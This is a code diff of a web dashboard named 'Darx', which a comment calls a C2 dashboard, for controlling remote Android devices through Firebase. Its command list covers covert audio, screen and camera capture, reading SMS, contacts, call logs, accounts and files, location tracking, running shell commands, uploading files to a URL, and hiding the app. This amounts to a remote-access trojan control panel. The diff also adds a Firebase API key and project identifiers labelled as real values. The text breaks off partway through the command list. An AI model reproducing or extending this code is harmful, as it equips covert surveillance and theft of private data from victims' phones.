@@ -54,7 +54,107 @@
             border-radius: 4px;
         }
 
-        /* ---------- TOPBAR ---------- */
+        /* ---------- LOGIN PAGE ---------- */
+        .login-page {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .login-box {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 32px 28px;
+            width: 100%;
+            max-width: 360px;
+            box-shadow: var(--shadow);
+        }
+        .login-box .logo-big {
+            text-align: center;
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: var(--accent2);
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+        }
+        .login-box .logo-big span {
+            color: var(--accent);
+        }
+        .login-box .sub {
+            text-align: center;
+            font-size: 0.75rem;
+            color: var(--muted);
+            margin-bottom: 20px;
+        }
+        .login-box .field-group {
+            margin-bottom: 14px;
+        }
+        .login-box .field-group label {
+            display: block;
+            font-size: 0.7rem;
+            color: var(--muted);
+            margin-bottom: 4px;
+        }
+        .login-box .field-group input {
+            width: 100%;
+            padding: 10px 12px;
+            background: var(--card2);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            color: var(--text);
+            font-size: 0.85rem;
+            font-family: inherit;
+            outline: none;
+            transition: border 0.15s;
+        }
+        .login-box .field-group input:focus {
+            border-color: var(--accent);
+        }
+        .login-box .login-btn {
+            width: 100%;
+            padding: 11px;
+            background: var(--accent);
+            color: #fff;
+            border: none;
+            border-radius: var(--radius-sm);
+            font-size: 0.85rem;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            transition: 0.15s;
+        }
+        .login-box .login-btn:hover {
+            background: var(--accent2);
+        }
+        .login-box .login-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .login-box .login-error {
+            font-size: 0.75rem;
+            color: var(--danger);
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+        .login-box .login-loading {
+            text-align: center;
+            font-size: 0.75rem;
+            color: var(--muted);
+            margin-top: 10px;
+            display: none;
+        }
+
+        /* ---------- DASHBOARD ---------- */
+        .app-container {
+            display: none;
+        }
+        .app-container.logged-in {
+            display: block;
+        }
+
         .topbar {
             position: fixed;
             top: 0;
@@ -89,7 +189,7 @@
             gap: 8px;
             font-size: 0.82rem;
             color: var(--muted);
-            max-width: 140px;
+            max-width: 180px;
         }
         .topbar-user .avatar {
             width: 28px;
@@ -123,6 +223,7 @@
             font-size: 0.75rem;
             cursor: pointer;
             transition: 0.2s;
+            font-family: inherit;
         }
         .topbar-right .logout-btn:hover {
             border-color: var(--danger);
@@ -161,6 +262,7 @@
             border: none;
             background: transparent;
             margin-bottom: 2px;
+            font-family: inherit;
         }
         .sidebar .nav-item svg {
             width: 20px;
@@ -233,8 +335,9 @@
             padding: 6px 10px;
             border-radius: var(--radius-sm);
             font-size: 0.75rem;
-            max-width: 140px;
+            max-width: 160px;
             cursor: pointer;
+            font-family: inherit;
         }
 
         /* ---------- STATS ROW ---------- */
@@ -349,10 +452,10 @@
             border: 1px solid var(--border);
             border-radius: var(--radius);
             width: 100%;
-            max-width: 380px;
-            padding: 20px;
+            max-width: 400px;
+            padding: 22px;
             box-shadow: var(--shadow);
-            max-height: 80vh;
+            max-height: 85vh;
             overflow-y: auto;
         }
         .modal h3 {
@@ -385,10 +488,46 @@
             color: var(--text);
             font-size: 0.82rem;
             font-family: inherit;
+            outline: none;
+        }
+        .modal .field-group input:focus,
+        .modal .field-group select:focus,
+        .modal .field-group textarea:focus {
+            border-color: var(--accent);
         }
         .modal .field-group textarea {
             min-height: 60px;
             resize: vertical;
+        }
+        .modal .field-group input[type="range"] {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 100%;
+            height: 6px;
+            background: var(--border);
+            border-radius: 4px;
+            outline: none;
+            padding: 0;
+            cursor: pointer;
+        }
+        .modal .field-group input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: var(--accent);
+            cursor: pointer;
+            border: 2px solid var(--card);
+            box-shadow: 0 0 6px rgba(108, 92, 231, 0.4);
+        }
+        .modal .field-group input[type="range"]::-moz-range-thumb {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: var(--accent);
+            cursor: pointer;
+            border: 2px solid var(--card);
         }
         .modal .modal-actions {
             display: flex;
@@ -419,25 +558,27 @@
             background: var(--accent2);
         }
 
-        /* ---------- TOAST / NOTIFICATION ---------- */
-        .toast {
+        /* ---------- TOAST ---------- */
+        .toast-container {
             position: fixed;
             bottom: 30px;
             left: 50%;
             transform: translateX(-50%);
             z-index: 2000;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            align-items: center;
+        }
+        .toast {
             background: var(--card);
             border: 1px solid var(--border);
             border-radius: var(--radius-sm);
             padding: 10px 20px;
             font-size: 0.82rem;
             box-shadow: var(--shadow);
-            display: none;
             max-width: 90vw;
             text-align: center;
-        }
-        .toast.show {
-            display: block;
             animation: toastIn 0.25s ease;
         }
         .toast.success {
@@ -446,14 +587,17 @@
         .toast.error {
             border-color: var(--danger);
         }
+        .toast.info {
+            border-color: var(--accent);
+        }
         @keyframes toastIn {
             from {
                 opacity: 0;
-                transform: translateX(-50%) translateY(16px);
+                transform: translateY(16px);
             }
             to {
                 opacity: 1;
-                transform: translateX(-50%) translateY(0);
+                transform: translateY(0);
             }
         }
 
@@ -481,6 +625,7 @@
         }
         .device-card .dc-dot.online {
             background: var(--success);
+            box-shadow: 0 0 8px rgba(46, 204, 113, 0.3);
         }
         .device-card .dc-dot.offline {
             background: var(--muted);
@@ -524,7 +669,90 @@
             opacity: 0.3;
         }
 
-        /* ---------- LOADING SPINNER ---------- */
+        /* ---------- RESULTS SECTION ---------- */
+        .results-section {
+            margin-top: 16px;
+        }
+        .results-section .results-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+        .results-section .results-header h4 {
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: var(--accent2);
+        }
+        .results-section .results-header span {
+            font-size: 0.7rem;
+            color: var(--muted);
+        }
+        .result-item {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 10px 14px;
+            margin-bottom: 6px;
+        }
+        .result-item .ri-top {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 4px;
+        }
+        .result-item .ri-action {
+            font-weight: 600;
+            font-size: 0.78rem;
+            flex: 1;
+        }
+        .result-item .ri-status {
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            letter-spacing: 0.4px;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: 700;
+        }
+        .result-item .ri-status.sending,
+        .result-item .ri-status.pending {
+            background: rgba(96, 165, 250, 0.15);
+            color: #60a5fa;
+        }
+        .result-item .ri-status.sent {
+            background: var(--card2);
+            color: var(--muted);
+        }
+        .result-item .ri-status.ok {
+            background: rgba(46, 204, 113, 0.15);
+            color: var(--success);
+        }
+        .result-item .ri-status.error {
+            background: rgba(231, 76, 60, 0.15);
+            color: var(--danger);
+        }
+        .result-item .ri-status.write_fail {
+            background: rgba(243, 156, 18, 0.15);
+            color: var(--warn);
+        }
+        .result-item .ri-time {
+            font-size: 0.65rem;
+            color: var(--muted);
+        }
+        .result-item .ri-output {
+            font-size: 0.7rem;
+            color: var(--muted);
+            word-break: break-word;
+            font-family: 'SF Mono', 'Fira Code', monospace;
+            max-height: 200px;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 4px;
+            padding: 6px 8px;
+            margin-top: 4px;
+        }
+
+        /* ---------- SPINNER ---------- */
         .spinner {
             display: inline-block;
             width: 24px;
@@ -570,7 +798,7 @@
                 font-size: 0.65rem;
             }
             .device-header .dev-select {
-                max-width: 100px;
+                max-width: 110px;
                 font-size: 0.68rem;
             }
             .topbar-user .uname {
@@ -582,14 +810,13 @@
                 grid-template-columns: repeat(2, 1fr);
             }
             .topbar-user {
-                max-width: 100px;
+                max-width: 110px;
             }
             .topbar-user .uname {
                 max-width: 60px;
             }
         }
 
-        /* hide sections initially */
         .page-section {
             display: none;
         }
@@ -600,61 +827,106 @@
 </head>
 <body>
 
-    <!-- ===== TOPBAR ===== -->
-    <header class="topbar">
-        <div class="topbar-left">
-            <div class="logo"><span>D</span>arx</div>
+    <!-- ===== LOGIN PAGE ===== -->
+    <div class="login-page" id="loginPage">
+        <div class="login-box">
+            <div class="logo-big"><span>D</span>arx</div>
+            <div class="sub">Sign in to your dashboard</div>
+            <div class="field-group">
+                <label>Email</label>
+                <input type="email" id="loginEmail" placeholder="you@example.com" autocomplete="email" />
+            </div>
+            <div class="field-group">
+                <label>Password</label>
+                <input type="password" id="loginPassword" placeholder="••••••••" autocomplete="current-password" />
+            </div>
+            <button class="login-btn" id="loginBtn" onclick="handleLogin()">Sign In</button>
+            <div class="login-error" id="loginError"></div>
+            <div class="login-loading" id="loginLoading">Signing in…</div>
         </div>
-        <div class="topbar-user" id="userInfo">
-            <div class="avatar" id="userAvatar">U</div>
-            <span class="uname" id="userName">Loading...</span>
-        </div>
-        <div class="topbar-right">
-            <button class="logout-btn" onclick="logout()">Logout</button>
-        </div>
-    </header>
+    </div>
 
-    <!-- ===== SIDEBAR ===== -->
-    <nav class="sidebar" id="sidebar">
-        <button class="nav-item active" data-page="devices" onclick="showPage('devices')">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="2"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="16" y1="2" x2="16" y2="6"/></svg>
-            <span>Devices</span>
-        </button>
-        <button class="nav-item" data-page="dashboard" onclick="showPage('dashboard')">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
-            <span>Panel</span>
-        </button>
-        <button class="nav-item" data-page="commands" onclick="showPage('commands')">
-            <svg viewBox="0 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
-            <span>Commands</span>
-        </button>
-    </nav>
+    <!-- ===== DASHBOARD APP ===== -->
+    <div class="app-container" id="appContainer">
 
-    <!-- ===== MAIN ===== -->
-    <main class="main" id="mainContent">
+        <!-- ===== TOPBAR ===== -->
+        <header class="topbar">
+            <div class="topbar-left">
+                <div class="logo"><span>D</span>arx</div>
+            </div>
+            <div class="topbar-user" id="userInfo">
+                <div class="avatar" id="userAvatar">U</div>
+                <span class="uname" id="userName">Loading...</span>
+            </div>
+            <div class="topbar-right">
+                <button class="logout-btn" onclick="handleLogout()">Logout</button>
+            </div>
+        </header>
 
-        <!-- ===== PAGE: DEVICES (default) ===== -->
-        <div class="page-section active" id="page-devices">
-            <div class="page-title">Your Devices</div>
-            <div class="page-sub" id="devicesSub">Select a device to control</div>
-            <div id="devicesList"></div>
-        </div>
+        <!-- ===== SIDEBAR ===== -->
+        <nav class="sidebar" id="sidebar">
+            <button class="nav-item active" data-page="devices" onclick="showPage('devices')">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="2"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="16" y1="2" x2="16" y2="6"/></svg>
+                <span>Devices</span>
+            </button>
+            <button class="nav-item" data-page="dashboard" onclick="showPage('dashboard')">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+                <span>Panel</span>
+            </button>
+            <button class="nav-item" data-page="commands" onclick="showPage('commands')">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+                <span>Commands</span>
+            </button>
+        </nav>
 
-        <!-- ===== PAGE: DASHBOARD (per-device control) ===== -->
-        <div class="page-section" id="page-dashboard">
-            <div id="dashboardContent"></div>
-        </div>
+        <!-- ===== MAIN ===== -->
+        <main class="main" id="mainContent">
 
-        <!-- ===== PAGE: COMMANDS (browse all) ===== -->
-        <div class="page-section" id="page-commands">
-            <div class="page-title">All Commands</div>
-            <div class="page-sub">Browse and execute commands on the selected device</div>
-            <div id="commandsBrowser"></div>
-        </div>
+            <!-- PAGE: DEVICES -->
+            <div class="page-section active" id="page-devices">
+                <div class="page-title">Your Devices</div>
+                <div class="page-sub" id="devicesSub">Loading your assigned devices...</div>
+                <div id="devicesList">
+                    <div class="empty-state"><div class="spinner"></div><br>Loading devices...</div>
+                </div>
+            </div>
 
-    </main>
+            <!-- PAGE: DASHBOARD (device control) -->
+            <div class="page-section" id="page-dashboard">
+                <div id="dashboardContent">
+                    <div class="empty-state">
+                        <div class="big-icon">📱</div>
+                        <strong>No device selected</strong><br>
+                        <span style="font-size:0.75rem;color:var(--muted)">Select a device from the Devices page first.</span>
+                    </div>
+                </div>
+            </div>
 
-    <!-- ===== MODAL ===== -->
+            <!-- PAGE: COMMANDS -->
+            <div class="page-section" id="page-commands">
+                <div class="page-title">All Commands</div>
+                <div class="page-sub" id="commandsSub">Browse and execute commands on the selected device</div>
+                <div id="commandsBrowser">
+                    <div class="empty-state">
+                        <div class="big-icon">⌘</div>
+                        <strong>Select a device first</strong><br>
+                        <span style="font-size:0.75rem;color:var(--muted)">Go to Devices → pick one → then use Commands.</span>
+                    </div>
+                </div>
+                <!-- Results log -->
+                <div class="results-section" id="resultsSection" style="display:none;">
+                    <div class="results-header">
+                        <h4>Command Log</h4>
+                        <span id="resultCount">0 results</span>
+                    </div>
+                    <div id="resultsBody"></div>
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <!-- ===== COMMAND MODAL ===== -->
     <div class="modal-overlay" id="modalOverlay">
         <div class="modal">
             <h3 id="modalTitle">Command</h3>
@@ -667,613 +939,785 @@
         </div>
     </div>
 
-    <!-- ===== TOAST ===== -->
-    <div class="toast" id="toast"></div>
+    <!-- ===== TOAST CONTAINER ===== -->
+    <div class="toast-container" id="toastContainer"></div>
 
     <script>
-        // ============================================================
-        // FIREBASE CONFIG — REPLACE WITH YOUR OWN
-        // ============================================================
-        const firebaseConfig = {
-            apiKey: "YOUR_API_KEY",
-            authDomain: "YOUR_PROJECT.firebaseapp.com",
-            projectId: "YOUR_PROJECT_ID",
-            storageBucket: "YOUR_PROJECT.appspot.com",
-            messagingSenderId: "YOUR_SENDER_ID",
-            appId: "YOUR_APP_ID"
-        };
+    // ============================================================
+    // FIREBASE CONFIG — REAL VALUES FROM THE ORIGINAL PROJECT
+    // ============================================================
+    const firebaseConfig = {
+        apiKey: "AIzaSyCbb-g6DhyCUjAcmglnkj-B3NLoI2KnL8o",
+        authDomain: "control-f5136.firebaseapp.com",
+        projectId: "control-f5136",
+        storageBucket: "control-f5136.firebasestorage.app",
+        messagingSenderId: "204625008820",
+        appId: "1:204625008820:web:2802cd55ea8f327e6a9fe1"
+    };
 
-        firebase.initializeApp(firebaseConfig);
-        const auth = firebase.auth();
-        const db = firebase.firestore();
+    firebase.initializeApp(firebaseConfig);
+    const auth = firebase.auth();
+    const db = firebase.firestore();
 
-        // ============================================================
-        // STATE
-        // ============================================================
-        let currentUser = null;
-        let userDevices = []; // array of device data
-        let selectedDeviceId = null;
-        let selectedDeviceData = null;
-        let pendingModalCommand = null;
-        let pendingModalParams = [];
+    // ============================================================
+    // STATE
+    // ============================================================
+    let currentUser = null;
+    let userDevices = [];
+    let selectedDeviceId = null;
+    let selectedDeviceData = null;
+    let pendingModalCommand = null;
+    let cmdResults = [];
+    let resultUnsub = null;
 
-        // ============================================================
-        // COMMAND DEFINITIONS (ALL from original C2 dashboard)
-        // ============================================================
-        const COMMAND_CATEGORIES = [{
-            id: 'device',
-            label: 'Device Control',
-            icon: '📱',
-            commands: [
-                { name: 'vibrate', label: 'Vibrate', params: [{ key: 'duration', type: 'number', label: 'Duration (ms)',
-                        def: '500' }] },
-                { name: 'click', label: 'Click', params: [
-                        { key: 'x', type: 'number', label: 'X coordinate', def: '500' },
-                        { key: 'y', type: 'number', label: 'Y coordinate', def: '500' }
-                    ] },
-                { name: 'type_text', label: 'Type Text', params: [{ key: 'text', type: 'text', label: 'Text to type',
-                        def: '' }] },
-                { name: 'swipe', label: 'Swipe', params: [
-                        { key: 'x1', type: 'number', label: 'From X', def: '200' },
-                        { key: 'y1', type: 'number', label: 'From Y', def: '500' },
-                        { key: 'x2', type: 'number', label: 'To X', def: '800' },
-                        { key: 'y2', type: 'number', label: 'To Y', def: '500' }
-                    ] },
-                { name: 'lock_screen', label: 'Lock Screen', params: [] },
-                { name: 'toggle_flashlight', label: 'Flashlight', params: [{ key: 'isToggle', type: 'select',
-                        label: 'Toggle', options: [{ v: 'true', l: 'On' }, { v: 'false', l: 'Off' }], def: 'true' }] },
-                { name: 'notify', label: 'Send Notification', params: [
-                        { key: 'title', type: 'text', label: 'Title', def: 'Alert' },
-                        { key: 'body', type: 'text', label: 'Body', def: 'Hello from Darx!' }
-                    ] },
-                { name: 'get_device_info', label: 'Device Info', params: [] },
-                { name: 'get_battery_info', label: 'Battery Info', params: [] },
-                { name: 'get_network_info', label: 'Network Info', params: [] },
-                { name: 'set_brightness', label: 'Brightness', params: [{ key: 'hasSeekbar', type: 'range',
-                        label: 'Brightness', min: 0, max: 255, def: '128' }] },
-                { name: 'find_phone', label: 'Find Phone', params: [{ key: 'isFindPhone', type: 'select', label: 'Action',
-                        options: [{ v: 'true', l: 'Start' }, { v: 'false', l: 'Stop' }], def: 'true' }] },
-                { name: 'wake_screen', label: 'Wake Screen', params: [] },
-                { name: 'mute', label: 'Mute Device', params: [{ key: 'isMute', type: 'select', label: 'Mode',
-                        options: [{ v: 'true', l: 'Mute' }, { v: 'false', l: 'Unmute' }], def: 'true' }] }
-            ]
-        }, {
-            id: 'media',
-            label: 'Media & Audio',
-            icon: '🎵',
-            commands: [
-                { name: 'record_audio', label: 'Record Audio', params: [{ key: 'duration', type: 'number',
-                        label: 'Duration (s)', def: '10' }] },
-                { name: 'record_screen', label: 'Record Screen', params: [
-                        { key: 'duration', type: 'number', label: 'Duration (s)', def: '15' },
-                        { key: 'quality', type: 'select', label: 'Quality',
-                            options: [{ v: 'low', l: 'Low' }, { v: 'medium', l: 'Medium' }, { v: 'high', l: 'High' }],
-                            def: 'medium' }
-                    ] },
-                { name: 'take_photo', label: 'Take Photo', params: [{ key: 'isCamera', type: 'select', label: 'Camera',
-                        options: [{ v: 'true', l: 'Rear' }, { v: 'false', l: 'Front' }], def: 'true' }] },
-                { name: 'play_sound', label: 'Play Sound', params: [{ key: 'url', type: 'text', label: 'Sound URL',
-                        def: '' }] },
-                { name: 'set_volume', label: 'Set Volume', params: [
-                        { key: 'hasSeekbar', type: 'range', label: 'Volume', min: 0, max: 100, def: '50' },
-                        { key: 'stream', type: 'select', label: 'Stream',
-                            options: [{ v: 'music', l: 'Music' }, { v: 'ring', l: 'Ring' }, { v: 'alarm',
-                                l: 'Alarm' }, { v: 'notification', l: 'Notification' }], def: 'music' }
-                    ] },
-                { name: 'set_ringer_mode', label: 'Ringer Mode', params: [{ key: 'mode', type: 'select', label: 'Mode',
-                        options: [{ v: 'normal', l: 'Normal' }, { v: 'silent', l: 'Silent' }, { v: 'vibrate',
-                            l: 'Vibrate' }], def: 'normal' }] }
-            ]
-        }, {
-            id: 'files',
-            label: 'Files & Screenshot',
-            icon: '📁',
-            commands: [
-                { name: 'take_screenshot', label: 'Take Screenshot', params: [] },
-                { name: 'clipboard_get', label: 'Get Clipboard', params: [] },
-                { name: 'clipboard_set', label: 'Set Clipboard', params: [{ key: 'text', type: 'text',
-                        label: 'Clipboard text', def: '' }] },
-                { name: 'list_directory', label: 'List Directory', params: [{ key: 'path', type: 'text',
-                        label: 'Directory path', def: '/' }] },
-                { name: 'read_file', label: 'Read File', params: [{ key: 'path', type: 'text', label: 'File path',
-                        def: '' }] },
-                { name: 'upload_file', label: 'Upload File', params: [
-                        { key: 'url', type: 'text', label: 'Upload URL', def: '' },
-                        { key: 'path', type: 'text', label: 'Local file path', def: '' }
-                    ] },
-                { name: 'download_file', label: 'Download File', params: [
-                        { key: 'url', type: 'text', label: 'File URL', def: '' },
-                        { key: 'path', type: 'text', label: 'Save path', def: '' }
-                    ] }
-            ]
-        }, {
-            id: 'admin',
-            label: 'Admin & Shell',
-            icon: '⚙️',
-            commands: [
-                { name: 'run_shell', label: 'Run Shell', params: [{ key: 'command', type: 'text', label: 'Shell command',
-                        def: 'id' }] },
-                { name: 'get_running_apps', label: 'Running Apps', params: [] },
-                { name: 'kill', label: 'Kill Process', params: [{ key: 'pid', type: 'number', label: 'PID', def: '' }] },
-                { name: 'ping', label: 'Ping Device', params: [] },
-                { name: 'open_url', label: 'Open URL', params: [{ key: 'url', type: 'text', label: 'URL', def: '' }] },
-                { name: 'start_call', label: 'Start Call', params: [
-                        { key: 'number', type: 'text', label: 'Phone number', def: '' },
-                        { key: 'simSlot', type: 'select', label: 'SIM slot',
-                            options: [{ v: '0', l: 'SIM 1' }, { v: '1', l: 'SIM 2' }], def: '0' }
-                    ] },
-                { name: 'send_sms', label: 'Send SMS', params: [
-                        { key: 'to', type: 'text', label: 'Recipient', def: '' },
-                        { key: 'text', type: 'text', label: 'Message', def: '' },
-                        { key: 'simSlot', type: 'select', label: 'SIM slot',
-                            options: [{ v: '0', l: 'SIM 1' }, { v: '1', l: 'SIM 2' }], def: '0' }
-                    ] },
-                { name: 'list_sms', label: 'List SMS', params: [{ key: 'isSmsFolder', type: 'select', label: 'Folder',
-                        options: [{ v: 'inbox', l: 'Inbox' }, { v: 'sent', l: 'Sent' }], def: 'inbox' }] },
-                { name: 'delete_sms', label: 'Delete SMS', params: [{ key: 'id', type: 'text', label: 'SMS ID',
-                    def: '' }] },
-                { name: 'get_sms_threads', label: 'SMS Threads', params: [] },
-                { name: 'list_sims', label: 'List SIMs', params: [] },
-                { name: 'get_contacts', label: 'Get Contacts', params: [] },
-                { name: 'get_call_log', label: 'Call Log', params: [{ key: 'hasLimit', type: 'number', label: 'Limit',
-                        def: '20' }] },
-                { name: 'get_installed_apps', label: 'Installed Apps', params: [] },
-                { name: 'get_accounts', label: 'Accounts', params: [] },
-                { name: 'enable_hotspot', label: 'Enable Hotspot', params: [] },
-                { name: 'disable_hotspot', label: 'Disable Hotspot', params: [] },
-                { name: 'show_message', label: 'Show Message', params: [{ key: 'text', type: 'text', label: 'Message',
-                        def: '' }] },
-                { name: 'freeze', label: 'Freeze App', params: [{ key: 'text', type: 'text', label: 'Package name',
-                        def: '' }] },
-                { name: 'unfreeze', label: 'Unfreeze', params: [] },
-                { name: 'update_overlay', label: 'Update Overlay', params: [{ key: 'text', type: 'text', label: 'Text',
-                        def: '' }] },
-                { name: 'hide_app', label: 'Hide/Show App', params: [{ key: 'isHideShow', type: 'select', label: 'Action',
-                        options: [{ v: 'hide', l: 'Hide' }, { v: 'show', l: 'Show' }], def: 'hide' }] },
-                { name: 'open_maps', label: 'Open Maps', params: [
-                        { key: 'lat', type: 'number', label: 'Latitude', def: '0' },
-                        { key: 'lng', type: 'number', label: 'Longitude', def: '0' }
-                    ] },
-                { name: 'open_app', label: 'Open App', params: [{ key: 'isOpenApp', type: 'select', label: 'Action',
-                        options: [{ v: 'true', l: 'Open' }, { v: 'false', l: 'Close' }], def: 'true' }] }
-            ]
-        }, {
-            id: 'loc',
-            label: 'Location & Sensors',
-            icon: '📍',
-            commands: [
-                { name: 'get_location', label: 'Get Location', params: [] },
-                { name: 'start_tracking', label: 'Start Tracking', params: [
-                        { key: 'isTrackingToggle', type: 'select', label: 'Action',
-                            options: [{ v: 'true', l: 'Start' }, { v: 'false', l: 'Stop' }], def: 'true' },
-                        { key: 'interval_ms', type: 'number', label: 'Interval (ms)', def: '5000' }
-                    ] },
-                { name: 'stop_tracking', label: 'Stop Tracking', params: [] },
-                { name: 'get_cell_towers', label: 'Cell Towers', params: [] },
-                { name: 'get_wifi_networks', label: 'WiFi Networks', params: [] },
-                { name: 'get_sensors', label: 'Get Sensors', params: [] }
-            ]
-        }];
+    // ============================================================
+    // ALL COMMAND DEFINITIONS (complete — same as original)
+    // ============================================================
+    const COMMAND_CATEGORIES = [{
+        id: 'device',
+        label: 'Device Control',
+        icon: '📱',
+        commands: [
+            { name: 'vibrate', label: 'Vibrate', params: [{ key: 'duration', type: 'number', label: 'Duration (ms)', def: '5000' }] },
+            { name: 'click', label: 'Click', params: [
+                { key: 'x', type: 'number', label: 'X', def: '500' },
+                { key: 'y', type: 'number', label: 'Y', def: '1000' }
+            ]},
+            { name: 'type_text', label: 'Type Text', params: [{ key: 'text', type: 'text', label: 'Text', def: 'Hello from Darx!' }] },
+            { name: 'swipe', label: 'Swipe', params: [
+                { key: 'x1', type: 'number', label: 'From X', def: '300' },
+                { key: 'y1', type: 'number', label: 'From Y', def: '800' },
+                { key: 'x2', type: 'number', label: 'To X', def: '300' },
+                { key: 'y2', type: 'number', label: 'To Y', def: '200' }
+            ]},
+            { name: 'lock_screen', label: 'Lock Screen', params: [] },
+            { name: 'toggle_flashlight', label: 'Flashlight', params: [{ key: 'state', type: 'select', label: 'State',
+                options: [{ v: 'on', l: 'On' }, { v: 'off', l: 'Off' }], def: 'on' }] },
+            { name: 'notify', label: 'Notification', params: [
+                { key: 'title', type: 'text', label: 'Title', def: 'Darx Alert' },
+                { key: 'body', type: 'text', label: 'Body', def: 'Command received!' }
+            ]},
+            { name: 'get_device_info', label: 'Device Info', params: [] },
+            { name: 'get_battery_info', label: 'Battery Info', params: [] },
+            { name: 'get_network_info', label: 'Network Info', params: [] },
+            { name: 'set_brightness', label: 'Brightness', params: [{ key: 'level', type: 'range', label: 'Brightness', min: 0, max: 255, def: '128' }] },
+            { name: 'find_phone', label: 'Find Phone', params: [{ key: 'action', type: 'select', label: 'Action',
+                options: [{ v: 'start', l: 'Start Ringing' }, { v: 'stop', l: 'Stop Ringing' }], def: 'start' }] },
+            { name: 'wake_screen', label: 'Wake Screen', params: [] },
+            { name: 'mute', label: 'Mute Device', params: [{ key: 'mode', type: 'select', label: 'Mode',
+                options: [{ v: 'mute', l: 'Mute' }, { v: 'normal', l: 'Normal' }, { v: 'vibrate', l: 'Vibrate' }], def: 'mute' }] }
+        ]
+    }, {
+        id: 'media',
+        label: 'Media & Audio',
+        icon: '🎵',
+        commands: [
+            { name: 'record_audio', label: 'Record Audio', params: [{ key: 'duration', type: 'number', label: 'Duration (s)', def: '15' }] },
+            { name: 'record_screen', label: 'Record Screen', params: [
+                { key: 'duration', type: 'number', label: 'Duration (s)', def: '30' },
+                { key: 'quality', type: 'select', label: 'Quality',
+                    options: [{ v: 'low', l: 'Low' }, { v: 'medium', l: 'Medium' }, { v: 'high', l: 'High' }], def: 'medium' }
+            ]},
+            { name: 'take_photo', label: 'Take Photo', params: [{ key: 'camera', type: 'select', label: 'Camera',
+                options: [{ v: 'back', l: 'Rear' }, { v: 'front', l: 'Front' }], def: 'back' }] },
+            { name: 'play_sound', label: 'Play Sound', params: [{ key: 'url', type: 'text', label: 'Sound URL', def: '' }] },
+            { name: 'set_volume', label: 'Set Volume', params: [
+                { key: 'level', type: 'range', label: 'Volume', min: 0, max: 100, def: '50' },
+                { key: 'stream', type: 'select', label: 'Stream',
+                    options: [{ v: 'media', l: 'Media' }, { v: 'ring', l: 'Ring' }, { v: 'alarm', l: 'Alarm' }, { v: 'notification', l: 'Notification' }], def: 'media' }
+            ]},
+            { name: 'set_ringer_mode', label: 'Ringer Mode', params: [{ key: 'mode', type: 'select', label: 'Mode',
+                options: [{ v: 'normal', l: 'Normal' }, { v: 'silent', l: 'Silent' }, { v: 'vibrate', l: 'Vibrate' }], def: 'silent' }] }
+        ]
+    }, {
+        id: 'files',
+        label: 'Files & Screenshot',
+        icon: '📁',
+        commands: [
+            { name: 'take_screenshot', label: 'Screenshot', params: [] },
+            { name: 'clipboard_get', label: 'Get Clipboard', params: [] },
+            { name: 'clipboard_set', label: 'Set Clipboard', params: [{ key: 'text', type: 'text', label: 'Text', def: 'pasted from Darx' }] },
+            { name: 'list_directory', label: 'List Files', params: [{ key: 'path', type: 'text', label: 'Path', def: '/storage/emulated/0' }] },
+            { name: 'read_file', label: 'Read File', params: [{ key: 'path', type: 'text', label: 'File path', def: '' }] },
+            { name: 'upload_file', label: 'Upload File', params: [
+                { key: 'url', type: 'text', label: 'Upload URL', def: '' },
+                { key: 'path', type: 'text', label: 'Local path', def: '' }
+            ]},
+            { name: 'download_file', label: 'Download File', params: [
+                { key: 'url', type: 'text', label: 'File URL', def: '' },
+                { key: 'path', type: 'text', label: 'Save path', def: '' }
+            ]}
+        ]
+    }, {
+        id: 'admin',
+        label: 'Admin & Shell',
+        icon: '⚙️',
+        commands: [
+            { name: 'run_shell', label: 'Run Shell', params: [{ key: 'command', type: 'text', label: 'Command', def: 'id' }] },
+            { name: 'get_running_apps', label: 'Running Apps', params: [] },
+            { name: 'kill', label: 'Kill Process', params: [{ key: 'pid', type: 'number', label: 'PID', def: '' }] },
+            { name: 'ping', label: 'Ping Device', params: [] },
